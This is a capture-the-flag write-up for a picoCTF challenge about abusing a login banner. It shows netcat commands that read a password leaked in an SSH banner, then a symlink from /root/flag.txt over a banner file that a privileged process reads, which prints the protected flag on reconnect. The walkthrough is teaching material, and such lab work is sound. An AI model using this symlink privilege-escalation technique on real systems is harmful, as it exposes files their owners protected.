# Overview 
Category: [General Skills]()

AUTHOR: LOIC SHEMA / SYREAL

# Description
Can you abuse the banner?
Additional details will be available after launching your challenge instance.

# Solution
- **we're going to start by exploring the leaked information from the initial server by netcatting that host and port**
  
> ┌──(kali㉿kali)-[/]
 
    └─$ nc tethys.picoctf.net 64478

SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

- **The Exploit**
  
  So now we have a password, we can see what it comes. We will step through a bit of questions and answers available on Google.

> ┌──(kali㉿kali)-[/] 

  └─$ nc tethys.picoctf.net 54610      


\*************************************

\*\*\*\*\*\*\*\*\*\*\*\*WELCOME\*\*\*\*\*\*\*\*\*\*\*\*

\*************************************

    what is the password? 
    My_Passw@rd_@1234
    What is the top cyber security conference in the world?
    DEFCON
    the first hacker ever was known for phreaking(making free phone calls), who was it?
    John Draper
    player@challenge:~$ ls
    banner text

>player@challenge:~$ cat banner

\*************************************

\*\*\*\*\*\*\*\*\*\*\*\*WELCOME\*\*\*\*\*\*\*\*\*\*\*\*

\*************************************

=> It is the code when I opened the connection

    player@challenge:~$ cat text
    keep digging

Now move to the root directory and get the flag?

    player@challenge:~$ cd /root
    player@challenge:/root$ ls
    flag.txt  script.py
    player@challenge:/root$ cat flag.txt
    cat: flag.txt: Permission denied

We have no permission to read it.We can try to symlink the flag to take the place of the banner, and see if it’s being read by something with a higher privilege level.

    player@challenge:/root$  ln -s /root/flag.txt ~/banner
    ln: failed to create symbolic link '/home/player/banner': File exists
    player@challenge:/root$ rm ~/banner
    player@challenge:/root$  ln -s /root/flag.txt ~/banner
    player@challenge:/root$ cd ~
    player@challenge:$ cat ~/banner
    cat: /home/player/banner: Permission denied

We still can’t cat this banner out, but it was served when we connected before, so what if we simply disconnect and reconnect?

>┌──(kali㉿kali)-[/]

    └─$ nc tethys.picoctf.net 54610

**picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}**

